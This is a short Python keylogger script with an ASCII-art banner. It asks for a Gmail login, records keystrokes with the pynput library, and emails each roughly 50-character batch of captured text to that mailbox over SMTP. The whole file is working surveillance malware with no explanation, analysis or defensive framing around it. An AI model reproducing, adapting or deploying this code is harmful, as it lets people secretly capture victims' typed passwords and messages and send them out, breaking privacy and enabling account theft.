import getpass, smtplib, ssl
from pynput.keyboard import Key, Listener
#list of imports 

#code title 
print('''
 _______   __    __  .___  ___. .___  ___. ____    ____    __  ___  ___________    ____ 
|       \ |  |  |  | |   \/   | |   \/   | \   \  /   /   |  |/  / |   ____\   \  /   / 
|  .--.  ||  |  |  | |  \  /  | |  \  /  |  \   \/   /    |  '  /  |  |__   \   \/   /  
|  |  |  ||  |  |  | |  |\/|  | |  |\/|  |   \_    _/     |    <   |   __|   \_    _/   
|  '--'  ||  `--'  | |  |  |  | |  |  |  |     |  |       |  .  \  |  |____    |  |     
|_______/  \______/  |__|  |__| |__|  |__|     |__|  _____|__|\__\ |_______|   |__|     
                                                    |______|                            ''')


#email dump

emailAddr = input('Enter email: ')
password = getpass.getpass(prompt='Enter Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(emailAddr, password)

#logger variables 
key_log = ''
word = ''
character_lim = 50

#key logger function 
def on_press(key):
    #global version 
    global key_log 
    global word
    global character_lim
    global emailAddr

    #filters for certain keys 
    if key == Key.space or key == Key.enter or key == Key.tab:
        word += ''
        key_log += word
        word = ''
        if len(key_log) >= character_lim:
            email_log()
            key_log = ''
    
    elif key == Key.shift_r or key == Key.shift_l:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char
        
    if key == Key.esc:
        return False

#email send function 
def email_log():
    server.sendmail(
        emailAddr,
        emailAddr,
        key_log
    )

with Listener(on_press=on_press) as listener:
    listener.join()
